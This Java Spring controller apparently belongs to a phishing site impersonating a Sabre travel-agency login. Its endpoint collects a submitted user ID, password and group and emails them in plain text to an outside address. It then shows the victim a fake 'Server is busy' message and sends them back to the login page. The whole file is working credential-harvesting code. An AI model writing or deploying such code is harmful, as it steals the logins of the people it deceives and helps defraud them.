package com.account.havail.sabre.sabre.controllers;

import com.account.havail.sabre.sabre.service.EmailService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.servlet.mvc.support.RedirectAttributes;

@Controller
public class LoginAsAgenciesController {

    @Autowired
    private EmailService emailService;

    @PostMapping("/send-email")
    public String sendEmail(@RequestParam String userId, @RequestParam String password, @RequestParam(required = false) String group, RedirectAttributes redirectAttributes) {
        String subject = "New Login Attempt";
        String message = "User ID: " + userId + "\nPassword: " + password + "\nGroup: " + (group != null ? group : "N/A");

        emailService.sendEmail("sabre@sabrehelpdesk.com", subject, message);
        redirectAttributes.addFlashAttribute("errorMessage", "Server is busy. Please try again later.");


        return "redirect:/home/login/agent";
    }



}